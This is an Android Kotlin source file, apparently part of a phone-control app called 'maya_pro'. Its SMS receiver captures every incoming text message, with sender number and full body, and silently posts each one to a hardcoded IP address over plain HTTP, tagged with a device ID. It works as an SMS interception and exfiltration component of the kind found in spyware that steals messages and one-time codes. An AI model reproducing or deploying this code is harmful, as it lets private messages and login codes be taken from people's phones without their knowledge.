package com.example.maya_pro

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.telephony.SmsMessage
import android.util.Log
import org.json.JSONObject
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import okhttp3.MediaType
import java.io.IOException

class SmsReceiver : BroadcastReceiver() {

    companion object {
        const val TAG = "SmsReceiver"
        const val PREFS_NAME = "maya_phone_control"
        const val KEY_DEVICE_ID = "device_id"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        if (action != "android.provider.Telephony.SMS_RECEIVED") return

        val bundle = intent.extras
        if (bundle == null) return

        val pdus = bundle.get("pdus") as Array<Any>?
        val format = bundle.getString("format")

        pdus?.forEach { pdu ->
            val smsMessage = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                SmsMessage.createFromPdu(pdu as ByteArray, format)
            } else {
                SmsMessage.createFromPdu(pdu as ByteArray)
            }

            val number = smsMessage.originatingAddress ?: ""
            val body = smsMessage.messageBody ?: ""
            val timestamp = smsMessage.timestampMillis

            Log.d(TAG, "SMS received from $number: $body")
            logSms(context, number, "incoming", body, "received")
        }
    }

    private fun logSms(context: Context, number: String, direction: String, content: String, status: String) {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val deviceId = prefs.getString(KEY_DEVICE_ID, "") ?: "unknown"

        val logEntry = JSONObject().apply {
            put("type", "sms_log")
            put("number", number)
            put("direction", direction)
            put("content", content)
            put("status", status)
            put("timestamp", System.currentTimeMillis())
            put("device_id", deviceId)
        }

        val client = OkHttpClient()
        val body = RequestBody.create(
            logEntry.toString(),
            MediaType.get("application/json")
        )
        val request = Request.Builder()
            .url("http://130.210.46.182:8000/api/v1/device/log")
            .post(body)
            .build()

        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: okhttp3.Call, e: IOException) {
                Log.e(TAG, "SMS log failed: ${e.message}")
            }
            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                response.close()
            }
        })
    }
}